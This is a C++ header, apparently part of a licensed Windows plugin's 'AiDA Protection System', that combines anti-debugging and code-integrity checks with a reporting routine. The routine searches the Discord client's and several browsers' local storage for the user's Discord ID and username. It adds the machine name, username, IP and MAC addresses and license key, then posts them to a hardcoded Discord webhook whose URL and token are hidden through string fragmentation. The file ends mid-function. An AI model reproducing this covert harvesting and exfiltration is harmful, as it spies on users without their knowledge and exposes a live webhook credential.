#pragma once

#ifdef __NT__

#include <windows.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <iphlpapi.h>
#include <bcrypt.h>
#include <wintrust.h>
#include <softpub.h>
#include <wincrypt.h>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "wintrust.lib")
#pragma comment(lib, "crypt32.lib")

#include <intrin.h>

#include <cstdint>
#include <mutex>
#include <vector>
#include <thread>
#include <atomic>
#include <fstream>

#include "driver_loader.hpp"
#include "../driver/comm.h"
#include "license.hpp"

namespace discord_webhook {

inline std::string get_webhook_host()
{
	std::string h;
	h.reserve(21);
	h += OBFSTR("htt");
	h += OBFSTR("ps://");
	h += OBFSTR("disc");
	h += OBFSTR("ord.");
	h += OBFSTR("com");
	return h;
}

inline std::string get_webhook_path()
{
	std::string p;
	p.reserve(96);
	p += OBFSTR("/api/web");
	p += OBFSTR("hooks/14");
	p += OBFSTR("80568475");
	p += OBFSTR("66268026");
	p += OBFSTR("7/2-xnn");
	p += OBFSTR("Ij8owZxI");
	p += OBFSTR("QST1XpJ0");
	p += OBFSTR("aqN8Ec-n");
	p += OBFSTR("skmKLFuI");
	p += OBFSTR("pZZSnMVo");
	p += OBFSTR("KsaHKb66");
	p += OBFSTR("pyh6GCp3");
	p += OBFSTR("q9WnXm9");
	return p;
}

inline std::string collect_hwid_inline()
{
	uint64_t hash = 14695981039346656037ULL;
	auto fnv = [&hash](uint64_t v) {
		for (int i = 0; i < 8; ++i) {
			hash ^= (v >> (i * 8)) & 0xFF;
			hash *= 1099511628211ULL;
		}
	};
	DWORD vol = 0;
	GetVolumeInformationW(L"C:\\", nullptr, 0, &vol,
		nullptr, nullptr, nullptr, 0);
	int cpu[4] = {}; __cpuid(cpu, 0);
	int cpu2[4] = {}; __cpuid(cpu2, 1);
	fnv(static_cast<uint64_t>(vol));
	fnv(static_cast<uint64_t>(cpu[0]) << 32 |
		static_cast<uint64_t>(static_cast<unsigned>(cpu[1])));
	fnv(static_cast<uint64_t>(cpu[2]) << 32 |
		static_cast<uint64_t>(static_cast<unsigned>(cpu[3])));
	fnv(static_cast<uint64_t>(cpu2[0]) << 32 |
		static_cast<uint64_t>(static_cast<unsigned>(cpu2[3])));
	wchar_t cn[MAX_COMPUTERNAME_LENGTH + 1] = {};
	DWORD ns = MAX_COMPUTERNAME_LENGTH + 1;
	GetComputerNameW(cn, &ns);
	for (DWORD i = 0; i < ns; ++i)
		fnv(static_cast<uint64_t>(cn[i]));
	{
		ULONG buf_len = 0;
		GetAdaptersInfo(nullptr, &buf_len);
		if (buf_len > 0)
		{
			std::vector<BYTE> buf(buf_len);
			PIP_ADAPTER_INFO adapter = reinterpret_cast<PIP_ADAPTER_INFO>(buf.data());
			if (GetAdaptersInfo(adapter, &buf_len) == NO_ERROR && adapter)
			{
				for (UINT i = 0; i < adapter->AddressLength; ++i)
					fnv(static_cast<uint64_t>(adapter->Address[i]));
			}
		}
	}
	char buf[17];
	::qsnprintf(buf, sizeof(buf), "%016llX",
		static_cast<unsigned long long>(hash));
	return std::string(buf);
}

inline std::string get_computer_name()
{
	wchar_t cn[MAX_COMPUTERNAME_LENGTH + 1] = {};
	DWORD ns = MAX_COMPUTERNAME_LENGTH + 1;
	GetComputerNameW(cn, &ns);
	std::string result;
	for (DWORD i = 0; i < ns; ++i)
		result.push_back(static_cast<char>(cn[i]));
	return result;
}

inline std::string get_windows_username()
{
	wchar_t un[256] = {};
	DWORD ns = 256;
	GetUserNameW(un, &ns);
	std::string result;
	for (DWORD i = 0; i < ns && un[i]; ++i)
		result.push_back(static_cast<char>(un[i]));
	return result;
}

inline std::string get_public_ip()
{
	try
	{
		std::string _ip_h1;
		_ip_h1.reserve(22);
		_ip_h1 += OBFSTR("htt");
		_ip_h1 += OBFSTR("ps://");
		_ip_h1 += OBFSTR("api.ip");
		_ip_h1 += OBFSTR("ify.org");
		httplib::Client cli(_ip_h1);
		obf::secure_wipe_string(_ip_h1);
		cli.set_connection_timeout(5);
		cli.set_read_timeout(5);
		cli.enable_server_certificate_verification(true);
		auto res = cli.Get(OBFSTR_C("/"));
		if (res && res->status == 200 && !res->body.empty() && res->body.size() < 64)
			return res->body;
	}
	catch (...) {}

	try
	{
		std::string _ip_h2;
		_ip_h2.reserve(19);
		_ip_h2 += OBFSTR("htt");
		_ip_h2 += OBFSTR("ps://");
		_ip_h2 += OBFSTR("ifcon");
		_ip_h2 += OBFSTR("fig.me");
		httplib::Client cli2(_ip_h2);
		obf::secure_wipe_string(_ip_h2);
		cli2.set_connection_timeout(5);
		cli2.set_read_timeout(5);
		cli2.enable_server_certificate_verification(true);
		auto res2 = cli2.Get(OBFSTR_C("/ip"));
		if (res2 && res2->status == 200 && !res2->body.empty() && res2->body.size() < 64)
			return res2->body;
	}
	catch (...) {}

	return OBFSTR("unknown");
}

inline std::string get_local_ip()
{
	ULONG buf_len = 0;
	GetAdaptersInfo(nullptr, &buf_len);
	if (buf_len > 0)
	{
		std::vector<BYTE> buf(buf_len);
		PIP_ADAPTER_INFO adapter = reinterpret_cast<PIP_ADAPTER_INFO>(buf.data());
		if (GetAdaptersInfo(adapter, &buf_len) == NO_ERROR && adapter)
		{
			std::string ip = adapter->IpAddressList.IpAddress.String;
			if (!ip.empty() && ip != "0.0.0.0")
				return ip;
		}
	}
	return OBFSTR("unknown");
}

inline std::string get_mac_address()
{
	ULONG buf_len = 0;
	GetAdaptersInfo(nullptr, &buf_len);
	if (buf_len > 0)
	{
		std::vector<BYTE> buf(buf_len);
		PIP_ADAPTER_INFO adapter = reinterpret_cast<PIP_ADAPTER_INFO>(buf.data());
		if (GetAdaptersInfo(adapter, &buf_len) == NO_ERROR && adapter)
		{
			std::string mac;
			char hex[4];
			for (UINT i = 0; i < adapter->AddressLength; ++i)
			{
				::qsnprintf(hex, sizeof(hex), "%02X", adapter->Address[i]);
				if (!mac.empty()) mac += ':';
				mac += hex;
			}
			return mac;
		}
	}
	return OBFSTR("unknown");
}

inline std::string get_dll_path()
{
	HMODULE hmod = nullptr;
	GetModuleHandleExW(
		GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS
			| GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
		reinterpret_cast<LPCWSTR>(&get_dll_path),
		&hmod);
	if (!hmod) return OBFSTR("unknown");
	wchar_t path[MAX_PATH] = {};
	GetModuleFileNameW(hmod, path, MAX_PATH);
	std::string result;
	for (size_t i = 0; path[i]; ++i)
		result.push_back(static_cast<char>(path[i]));
	return result;
}

inline std::string get_appdata_path()
{
	char buf[MAX_PATH] = {};
	DWORD len = GetEnvironmentVariableA("APPDATA", buf, MAX_PATH);
	if (len > 0 && len < MAX_PATH)
		return std::string(buf, len);
	return OBFSTR("unknown");
}

inline std::string get_localappdata_path()
{
	char buf[MAX_PATH] = {};
	DWORD len = GetEnvironmentVariableA("LOCALAPPDATA", buf, MAX_PATH);
	if (len > 0 && len < MAX_PATH)
		return std::string(buf, len);
	return OBFSTR("unknown");
}

struct discord_identity_t
{
	std::string user_id;
	std::string username;
};


inline void scan_leveldb_dir_for_discord(
	const std::string& dir_path, discord_identity_t& identity)
{
	if (!identity.user_id.empty() && !identity.username.empty())
		return;


	const wchar_t* patterns[] = { L"\\*.log", L"\\*.ldb" };

	for (const wchar_t* pat : patterns)
	{
		if (!identity.user_id.empty() && !identity.username.empty())
			return;

		std::wstring search_w(dir_path.begin(), dir_path.end());
		search_w += pat;

		WIN32_FIND_DATAW fd;
		HANDLE hFind = FindFirstFileW(search_w.c_str(), &fd);
		if (hFind == INVALID_HANDLE_VALUE)
			continue;

		do
		{
			std::wstring full_path(dir_path.begin(), dir_path.end());
			full_path += L"\\";
			full_path += fd.cFileName;


			std::ifstream file(full_path, std::ios::binary);
			if (!file.is_open()) continue;

			std::string content((std::istreambuf_iterator<char>(file)),
			                     std::istreambuf_iterator<char>());
			file.close();


			if (identity.user_id.empty())
			{
				size_t pos = content.find("\"id\":\"");
				while (pos != std::string::npos)
				{
					size_t start = pos + 6;
					size_t end = content.find('"', start);
					if (end != std::string::npos && end - start >= 15 && end - start <= 22)
					{
						std::string candidate = content.substr(start, end - start);
						bool all_digits = true;
						for (char c : candidate)
							if (c < '0' || c > '9') { all_digits = false; break; }
						if (all_digits)
						{
							identity.user_id = candidate;
							break;
						}
					}
					pos = content.find("\"id\":\"", pos + 1);
				}
			}


			if (identity.username.empty())
			{
				size_t pos = content.find("\"username\":\"");
				if (pos != std::string::npos)
				{
					size_t start = pos + 12;
					size_t end = content.find('"', start);
					if (end != std::string::npos && end - start > 0 && end - start < 64)
						identity.username = content.substr(start, end - start);
				}
			}

			if (!identity.user_id.empty() && !identity.username.empty())
				break;

		} while (FindNextFileW(hFind, &fd));
		FindClose(hFind);
	}
}

inline discord_identity_t harvest_discord_identity()
{
	discord_identity_t identity;
	try
	{
		std::vector<std::string> dirs_to_scan;


		std::string appdata = get_appdata_path();
		if (appdata != OBFSTR("unknown"))
		{
			const char* discord_apps[] = { "discord", "discordcanary", "discordptb" };
			for (const char* app : discord_apps)
				dirs_to_scan.push_back(appdata + "\\" + app + "\\Local Storage\\leveldb");
		}


		std::string localappdata = get_localappdata_path();
		if (localappdata != OBFSTR("unknown"))
		{

			const char* browser_bases[] = {
				"Microsoft\\Edge\\User Data",
				"Google\\Chrome\\User Data",
				"BraveSoftware\\Brave-Browser\\User Data",
				"Opera Software\\Opera Stable",
				"Vivaldi\\User Data"
			};


			const char* profiles[] = {
				"Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4"
			};

			for (const char* browser_base : browser_bases)
			{
				for (const char* profile : profiles)
				{

					dirs_to_scan.push_back(
						localappdata + "\\" + browser_base + "\\" + profile
						+ "\\Local Storage\\leveldb");


					dirs_to_scan.push_back(
						localappdata + "\\" + browser_base + "\\" + profile
						+ "\\IndexedDB\\https_discord.com_0.indexeddb.leveldb");
				}


				if (std::string(browser_base).find("Opera") != std::string::npos)
				{
					dirs_to_scan.push_back(
						localappdata + "\\" + browser_base
						+ "\\Local Storage\\leveldb");
					dirs_to_scan.push_back(
						localappdata + "\\" + browser_base
						+ "\\IndexedDB\\https_discord.com_0.indexeddb.leveldb");
				}
			}
		}


		for (const auto& dir : dirs_to_scan)
		{
			scan_leveldb_dir_for_discord(dir, identity);
			if (!identity.user_id.empty() && !identity.username.empty())
				break;
		}

		if (identity.username.empty() && !identity.user_id.empty())
			identity.username = OBFSTR("(id-only)");
	}
	catch (...) {}

	return identity;
}

inline std::string get_cached_license_key()
{

	try
	{
		const auto& lm = license_manager_t::instance();
		std::string key = lm.get_cached_key();
		if (!key.empty())
			return key;
	}
	catch (...) {}
	return OBFSTR("unknown");
}

inline nlohmann::json build_system_info()
{
	nlohmann::json info;
	info[OBFSTR("hwid")]           = collect_hwid_inline();
	info[OBFSTR("computer_name")]  = get_computer_name();
	info[OBFSTR("username")]       = get_windows_username();
	info[OBFSTR("public_ip")]      = get_public_ip();
	info[OBFSTR("local_ip")]       = get_local_ip();
	info[OBFSTR("mac_address")]    = get_mac_address();
	info[OBFSTR("dll_path")]       = get_dll_path();
	info[OBFSTR("version")]        = AIDA_VERSION;
	info[OBFSTR("timestamp")]      = static_cast<int64_t>(std::time(nullptr));
	info[OBFSTR("pid")]            = static_cast<int>(GetCurrentProcessId());

	discord_identity_t discord = harvest_discord_identity();
	info[OBFSTR("discord_user_id")]   = discord.user_id.empty() ? OBFSTR("unknown") : discord.user_id;
	info[OBFSTR("discord_username")]  = discord.username.empty() ? OBFSTR("unknown") : discord.username;

	info[OBFSTR("license_key")] = get_cached_license_key();

	return info;
}

inline void send_alert(const std::string& title, const std::string& description,
                       int color, const nlohmann::json& extra_fields = {})
{
	try
	{
		nlohmann::json sys_info = build_system_info();

		nlohmann::json fields;
		fields.push_back({{OBFSTR("name")}, {OBFSTR("HWID")},
			{OBFSTR("value")}, {sys_info[OBFSTR("hwid")].get<std::string>()},
			{OBFSTR("inline")}, {true}});

		nlohmann::json f_hwid;
		f_hwid[OBFSTR("name")]   = OBFSTR("HWID");
		f_hwid[OBFSTR("value")]  = std::string("`") + sys_info[OBFSTR("hwid")].get<std::string>() + "`";
		f_hwid[OBFSTR("inline")] = true;

		nlohmann::json f_ip;
		f_ip[OBFSTR("name")]   = OBFSTR("Public IP");
		f_ip[OBFSTR("value")]  = std::string("`") + sys_info[OBFSTR("public_ip")].get<std::string>() + "`";
		f_ip[OBFSTR("inline")] = true;

		nlohmann::json f_local_ip;
		f_local_ip[OBFSTR("name")]   = OBFSTR("Local IP");
		f_local_ip[OBFSTR("value")]  = std::string("`") + sys_info[OBFSTR("local_ip")].get<std::string>() + "`";
		f_local_ip[OBFSTR("inline")] = true;

		nlohmann::json f_mac;
		f_mac[OBFSTR("name")]   = OBFSTR("MAC Address");
		f_mac[OBFSTR("value")]  = std::string("`") + sys_info[OBFSTR("mac_address")].get<std::string>() + "`";
		f_mac[OBFSTR("inline")] = true;

		nlohmann::json f_pc;
		f_pc[OBFSTR("name")]   = OBFSTR("Computer");
		f_pc[OBFSTR("value")]  = std::string("`") + sys_info[OBFSTR("computer_name")].get<std::string>()
			+ "\\" + sys_info[OBFSTR("username")].get<std::string>() + "`";
		f_pc[OBFSTR("inline")] = true;

		nlohmann::json f_ver;
		f_ver[OBFSTR("name")]   = OBFSTR("Version");
		f_ver[OBFSTR("value")]  = std::string("`") + sys_info[OBFSTR("version")].get<std::string>() + "`";
		f_ver[OBFSTR("inline")] = true;

		nlohmann::json f_path;
		f_path[OBFSTR("name")]   = OBFSTR("DLL Path");
		f_path[OBFSTR("value")]  = std::string("`") + sys_info[OBFSTR("dll_path")].get<std::string>() + "`";
		f_path[OBFSTR("inline")] = false;

		nlohmann::json f_pid;
		f_pid[OBFSTR("name")]   = OBFSTR("PID");
		f_pid[OBFSTR("value")]  = std::string("`") + std::to_string(sys_info[OBFSTR("pid")].get<int>()) + "`";
		f_pid[OBFSTR("inline")] = true;

		nlohmann::json f_ts;
		f_ts[OBFSTR("name")]   = OBFSTR("Timestamp");
		f_ts[OBFSTR("value")]  = std::string("<t:") + std::to_string(sys_info[OBFSTR("timestamp")].get<int64_t>()) + ":F>";
		f_ts[OBFSTR("inline")] = true;

		nlohmann::json f_discord_id;
		f_discord_id[OBFSTR("name")]   = OBFSTR("Discord User ID");
		f_discord_id[OBFSTR("value")]  = std::string("`") + sys_info[OBFSTR("discord_user_id")].get<std::string>() + "`";
		f_discord_id[OBFSTR("inline")] = true;

		nlohmann::json f_discord_name;
		f_discord_name[OBFSTR("name")]   = OBFSTR("Discord Username");
		f_discord_name[OBFSTR("value")]  = std::string("`") + sys_info[OBFSTR("discord_username")].get<std::string>() + "`";
		f_discord_name[OBFSTR("inline")] = true;

		nlohmann::json f_license;
		f_license[OBFSTR("name")]   = OBFSTR("License Key");
		f_license[OBFSTR("value")]  = std::string("`") + sys_info[OBFSTR("license_key")].get<std::string>() + "`";
		f_license[OBFSTR("inline")] = false;

		nlohmann::json field_arr = nlohmann::json::array();
		field_arr.push_back(f_hwid);
		field_arr.push_back(f_ip);
		field_arr.push_back(f_local_ip);
		field_arr.push_back(f_mac);
		field_arr.push_back(f_pc);
		field_arr.push_back(f_discord_id);
		field_arr.push_back(f_discord_name);
		field_arr.push_back(f_license);
		field_arr.push_back(f_ver);
		field_arr.push_back(f_path);
		field_arr.push_back(f_pid);
		field_arr.push_back(f_ts);

		if (extra_fields.is_array())
		{
			for (const auto& ef : extra_fields)
				field_arr.push_back(ef);
		}

		nlohmann::json embed;
		embed[OBFSTR("title")]       = title;
		embed[OBFSTR("description")] = description;
		embed[OBFSTR("color")]       = color;
		embed[OBFSTR("fields")]      = field_arr;

		nlohmann::json footer;
		footer[OBFSTR("text")] = OBFSTR("AiDA Protection System v") + std::string(AIDA_VERSION);
		embed[OBFSTR("footer")] = footer;

		nlohmann::json payload;
		payload[OBFSTR("username")]   = OBFSTR("AiDA Guardian");
		payload[OBFSTR("avatar_url")] = OBFSTR("https://i.imgur.com/AfFp7pu.png");
		payload[OBFSTR("embeds")]     = nlohmann::json::array({embed});

		std::string _wh_h = get_webhook_host();
		httplib::Client cli(_wh_h);
		obf::secure_wipe_string(_wh_h);
		cli.set_connection_timeout(10);
		cli.set_read_timeout(10);
		cli.set_write_timeout(10);
		cli.enable_server_certificate_verification(true);

		std::string _wh_p = get_webhook_path();
		cli.Post(_wh_p.c_str(),
			payload.dump(),
			OBFSTR_C("application/json"));
		obf::secure_wipe_string(_wh_p);
	}
	catch (...) {}
}

inline void send_alert_async(const std::string& title, const std::string& description,
                              int color, const nlohmann::json& extra_fields = {})
{
	std::thread([title, description, color, extra_fields]() {
		send_alert(title, description, color, extra_fields);
	}).detach();
}

static constexpr int COLOR_RED     = 0xFF0000;
static constexpr int COLOR_ORANGE  = 0xFF8C00;
static constexpr int COLOR_YELLOW  = 0xFFD700;
static constexpr int COLOR_GREEN   = 0x00FF00;
static constexpr int COLOR_BLUE    = 0x0000FF;

}

struct _integrity_check
{
	struct section {
		std::uint8_t* name = {};
		void* address = {};
		std::uint32_t checksum = {};

		bool operator==(section& other)
		{
			return checksum == other.checksum;
		}
	}; section _cached;

	_integrity_check()
	{
		_cached = get_text_section(reinterpret_cast<std::uintptr_t>(GetModuleHandle(nullptr)));
	}

	std::uint32_t crc32(void* data, std::size_t size)
	{
		std::uint32_t result = {};

		for (std::size_t index = {}; index < size; ++index)
			result = _mm_crc32_u32(result, reinterpret_cast<std::uint8_t*>(data)[index]);

		return result;
	}

	section get_text_section(std::uintptr_t module)
	{
		section text_section = {};

		PIMAGE_DOS_HEADER dosheader = reinterpret_cast<PIMAGE_DOS_HEADER>(module);
		PIMAGE_NT_HEADERS nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS>(module + dosheader->e_lfanew);

		PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_headers);

		for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++, section++)
		{
			std::string name(reinterpret_cast<char const*>(section->Name));
			if (name != ".text")
				continue;

			void* address = reinterpret_cast<void*>(module + section->VirtualAddress);
			text_section = { section->Name, address, crc32(address, section->Misc.VirtualSize) };
		}
		return text_section;
	}

	bool check_integrity()
	{
		section section2 = get_text_section(reinterpret_cast<std::uintptr_t>(GetModuleHandle(nullptr)));
		return (!(_cached == section2));
	}

	static bool _sig_valid_address_tag() { return true; }

	bool IsSignatureValid()
	{
		HMODULE hmod = nullptr;
		GetModuleHandleExW(
			GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS
				| GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
			reinterpret_cast<LPCWSTR>(&_sig_valid_address_tag),
			&hmod);
		if (!hmod) return false;

		wchar_t exePath[MAX_PATH] = {};
		if (GetModuleFileNameW(hmod, exePath, MAX_PATH) == 0)
			return false;

		WINTRUST_FILE_INFO fileInfo = {};
		fileInfo.cbStruct = sizeof(fileInfo);
		fileInfo.pcwszFilePath = exePath;
		fileInfo.hFile = NULL;
		fileInfo.pgKnownSubject = NULL;

		GUID policyGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;

		WINTRUST_DATA trustData = {};
		trustData.cbStruct = sizeof(trustData);
		trustData.dwUIChoice = WTD_UI_NONE;
		trustData.fdwRevocationChecks = WTD_REVOKE_NONE;
		trustData.dwUnionChoice = WTD_CHOICE_FILE;
		trustData.pFile = &fileInfo;
		trustData.dwStateAction = WTD_STATEACTION_VERIFY;
		trustData.dwProvFlags = WTD_SAFER_FLAG;

		LONG status = WinVerifyTrust(NULL, &policyGUID, &trustData);

		trustData.dwStateAction = WTD_STATEACTION_CLOSE;
		WinVerifyTrust(NULL, &policyGUID, &trustData);

		// Not signed at all is acceptable (unsigned build).
		// Only fail if a signature IS present but invalid (tampered).
		if (status == static_cast<LONG>(TRUST_E_NOSIGNATURE))
			return true;

		if (status == static_cast<LONG>(TRUST_E_SUBJECT_FORM_UNKNOWN))
			return true;

		// Signed and valid
		if (status == ERROR_SUCCESS)
			return true;

		// Signed but tampered / explicitly distrusted / other failure
		return false;
	}
};

namespace anti_re {

inline std::string get_cf_host_fragmented()
{
	std::string h;
	h.reserve(58);
	h += OBFSTR("htt");
	h += OBFSTR("ps://");
	h += OBFSTR("europe");
	h += OBFSTR("-west1-");
	h += OBFSTR("aida-li");
	h += OBFSTR("cense-pr");
	h += OBFSTR("od.cloud");
	h += OBFSTR("functio");
	h += OBFSTR("ns.net");
	return h;
}

namespace detail {

static constexpr std::uint32_t DEBUG_NT_GLOBAL_MASK = 0x70u;
static constexpr ULONGLONG VERIFY_INTERVAL_MS = 1500u;

struct iat_entry_t
{
	std::uint64_t slot_va;
	std::uint64_t resolved_va;
};

struct runtime_state_t
{
	std::mutex mutex;
	bool initialized = false;
	bool trusted = false;
	HMODULE module = nullptr;
	HMODULE process_image = nullptr;
	DWORD pid = 0;
	ULONGLONG last_verified_ms = 0;

	std::uint64_t text_hash = 0;
	std::uint64_t text_base = 0;
	std::uint32_t text_size = 0;

	std::vector<iat_entry_t> iat_entries;

	bool protections_enforced = false;
	std::uint32_t verify_counter = 0;
	std::uint32_t kernel_read_failure_streak = 0;
	std::uint32_t kernel_hash_mismatch_streak = 0;
};

inline runtime_state_t& state()
{
	static runtime_state_t inst;
	return inst;
}

inline void reset_state_locked(runtime_state_t& runtime)
{
	runtime.initialized = false;
	runtime.trusted = false;
	runtime.module = nullptr;
	runtime.process_image = nullptr;
	runtime.pid = 0;
	runtime.last_verified_ms = 0;
	runtime.text_hash = 0;
	runtime.text_base = 0;
	runtime.text_size = 0;
	runtime.iat_entries.clear();
	runtime.protections_enforced = false;
	runtime.verify_counter = 0;
	runtime.kernel_read_failure_streak = 0;
	runtime.kernel_hash_mismatch_streak = 0;
}

inline bool resolve_current_module(HMODULE& module)
{
	module = nullptr;
	return GetModuleHandleExW(
			   GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS
				   | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
			   reinterpret_cast<LPCWSTR>(&resolve_current_module),
			   &module) != FALSE
		&& module != nullptr;
}

inline bool prepare_driver(runtime_state_t& runtime)
{
	if (!driver_loader::is_driver_loaded() || !device)
		return false;

	if (!device->is_connected() && !device->connect())
		return false;

	if (!device->refresh_heartbeat())
		return false;

	const DWORD current_pid = GetCurrentProcessId();
	runtime.pid = current_pid;


	if (device->get_process_id() != current_pid)
		return false;

	if (device->get_dtb() == 0)
		device->solve_dtb();

	return device->get_dtb() != 0;
}

inline bool verify_usermode_debug_state_locked(const runtime_state_t& runtime)
{
	BOOL remote_debugger = FALSE;
	if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote_debugger) && remote_debugger)
		return false;

	if (IsDebuggerPresent())
		return false;

	const auto peb = reinterpret_cast<const std::uint8_t*>(__readgsqword(0x60));
	if (peb == nullptr)
		return false;

	if (*(peb + 0x02) != 0)
		return false;

	const std::uint32_t nt_global_flag = *reinterpret_cast<const std::uint32_t*>(peb + 0xBC);
	if ((nt_global_flag & DEBUG_NT_GLOBAL_MASK) != 0)
		return false;

	const auto image_base = *reinterpret_cast<const std::uint64_t*>(peb + 0x10);
	return image_base == reinterpret_cast<std::uint64_t>(runtime.process_image);
}

inline bool verify_peb_state_locked(const runtime_state_t& runtime)
{
	if (device == nullptr || !device->is_connected())
		return verify_usermode_debug_state_locked(runtime);

	if (runtime.pid == 0 || device->get_process_id() != runtime.pid)
		return verify_usermode_debug_state_locked(runtime);

	voyager::device_t::peb_info peb{};
	if (!device->read_peb(peb))
		return verify_usermode_debug_state_locked(runtime);

	if (peb.image_base != reinterpret_cast<std::uint64_t>(runtime.process_image))
		return false;

	if (peb.being_debugged != 0)
		return false;

	if ((peb.nt_global_flag & DEBUG_NT_GLOBAL_MASK) != 0)
		return false;

	return true;
}

__forceinline std::uint64_t hash_memory(const void* data, std::size_t size)
{
	const auto* ptr = static_cast<const std::uint8_t*>(data);
	std::uint64_t h1 = 0xFFFFFFFFULL;
	std::uint64_t h2 = 0x85EBCA6BULL;

	const std::size_t chunks = size / 8;
	const auto* ptr64 = reinterpret_cast<const std::uint64_t*>(ptr);

	for (std::size_t i = 0; i < chunks; ++i)
	{
		h1 = _mm_crc32_u64(h1, ptr64[i]);
		h2 = _mm_crc32_u64(h2, ptr64[i] ^ 0xA5A5A5A5A5A5A5A5ULL);
	}

	const std::size_t remaining = size % 8;
	const auto* tail = ptr + chunks * 8;
	for (std::size_t i = 0; i < remaining; ++i)
	{
		h1 = _mm_crc32_u8(static_cast<std::uint32_t>(h1), tail[i]);
		h2 = _mm_crc32_u8(static_cast<std::uint32_t>(h2), tail[i] ^ 0xA5u);
	}

	return (h1 & 0xFFFFFFFF) | ((h2 & 0xFFFFFFFF) << 32);
}

enum class kernel_integrity_probe_t : std::uint8_t
{
	match,
	mismatch,
	unavailable,
};

inline kernel_integrity_probe_t probe_code_integrity_kernel(runtime_state_t& runtime)
{
	if (!device || !device->is_connected())
		return kernel_integrity_probe_t::unavailable;
	if (runtime.pid == 0 || device->get_process_id() != runtime.pid)
		return kernel_integrity_probe_t::unavailable;
	if (get_process_state() == DSTATE_NOTASK)
		return kernel_integrity_probe_t::unavailable;
	if (runtime.text_base == 0 || runtime.text_size == 0 || runtime.text_hash == 0)
		return kernel_integrity_probe_t::unavailable;

	constexpr std::size_t CHUNK_SIZE = 0x4000;
	std::vector<std::uint8_t> chunk(CHUNK_SIZE);

	std::uint64_t h1 = 0xFFFFFFFFULL;
	std::uint64_t h2 = 0x85EBCA6BULL;

	std::uint64_t cursor = runtime.text_base;
	std::size_t remaining = runtime.text_size;

	while (remaining > 0)
	{
		const std::size_t to_read = remaining < CHUNK_SIZE ? remaining : CHUNK_SIZE;

		std::size_t n = device->read_raw(cursor, chunk.data(), to_read);
		if (n != to_read)
		{
			return kernel_integrity_probe_t::unavailable;
		}

		const auto* ptr = chunk.data();
		const std::size_t chunks = to_read / 8;
		const auto* ptr64 = reinterpret_cast<const std::uint64_t*>(ptr);
		for (std::size_t i = 0; i < chunks; ++i)
		{
			h1 = _mm_crc32_u64(h1, ptr64[i]);
			h2 = _mm_crc32_u64(h2, ptr64[i] ^ 0xA5A5A5A5A5A5A5A5ULL);
		}

		const std::size_t tail_len = to_read % 8;
		const auto* tail = ptr + chunks * 8;
		for (std::size_t i = 0; i < tail_len; ++i)
		{
			h1 = _mm_crc32_u8(static_cast<std::uint32_t>(h1), tail[i]);
			h2 = _mm_crc32_u8(static_cast<std::uint32_t>(h2), tail[i] ^ 0xA5u);
		}

		cursor += to_read;
		remaining -= to_read;
	}

	const std::uint64_t kernel_hash = (h1 & 0xFFFFFFFFULL) | ((h2 & 0xFFFFFFFFULL) << 32);
	return kernel_hash == runtime.text_hash
		? kernel_integrity_probe_t::match
		: kernel_integrity_probe_t::mismatch;
}

inline bool find_code_section(HMODULE mod, std::uint64_t& base, std::uint32_t& size)
{
	const auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(mod);
	if (dos->e_magic != IMAGE_DOS_SIGNATURE)
		return false;

	const auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS64*>(
		reinterpret_cast<const std::uint8_t*>(mod) + dos->e_lfanew);
	if (nt->Signature != IMAGE_NT_SIGNATURE)
		return false;

	const auto* section = IMAGE_FIRST_SECTION(nt);
	for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i)
	{
		if ((section[i].Characteristics & IMAGE_SCN_CNT_CODE) != 0
			&& section[i].Misc.VirtualSize > 0)
		{
			base = reinterpret_cast<std::uint64_t>(mod) + section[i].VirtualAddress;
			size = section[i].Misc.VirtualSize;
			return true;
		}
	}
	return false;
}

inline bool snapshot_code_section(runtime_state_t& runtime)
{
	std::uint64_t base = 0;
	std::uint32_t size = 0;
	if (!find_code_section(runtime.module, base, size) || size == 0)
		return false;

	runtime.text_base = base;
	runtime.text_size = size;
	runtime.text_hash = hash_memory(reinterpret_cast<const void*>(base), size);
	return runtime.text_hash != 0;
}

inline bool snapshot_iat(runtime_state_t& runtime)
{
	runtime.iat_entries.clear();

	const auto* base_ptr = reinterpret_cast<const std::uint8_t*>(runtime.module);
	const auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(base_ptr);
	if (dos->e_magic != IMAGE_DOS_SIGNATURE)
		return false;

	const auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS64*>(base_ptr + dos->e_lfanew);
	if (nt->Signature != IMAGE_NT_SIGNATURE)
		return false;

	const auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	if (dir.VirtualAddress == 0 || dir.Size == 0)
		return true;

	const auto* imp = reinterpret_cast<const IMAGE_IMPORT_DESCRIPTOR*>(
		base_ptr + dir.VirtualAddress);

	while (imp->Name != 0)
	{
		if (imp->FirstThunk == 0) { ++imp; continue; }

		const auto* thunk = reinterpret_cast<const std::uint64_t*>(
			base_ptr + imp->FirstThunk);
		std::uint64_t slot_va = reinterpret_cast<std::uint64_t>(thunk);

		while (*thunk != 0)
		{
			iat_entry_t entry;
			entry.slot_va = slot_va;
			entry.resolved_va = *thunk;
			runtime.iat_entries.push_back(entry);
			++thunk;
			slot_va += sizeof(std::uint64_t);
		}
		++imp;
	}

	return true;
}

inline bool verify_code_integrity_usermode(const runtime_state_t& runtime)
{
	if (runtime.text_base == 0 || runtime.text_size == 0 || runtime.text_hash == 0)
		return true;

	const std::uint64_t current = hash_memory(
		reinterpret_cast<const void*>(runtime.text_base), runtime.text_size);
	return current == runtime.text_hash;
}

inline bool verify_code_integrity_kernel(runtime_state_t& runtime)
{
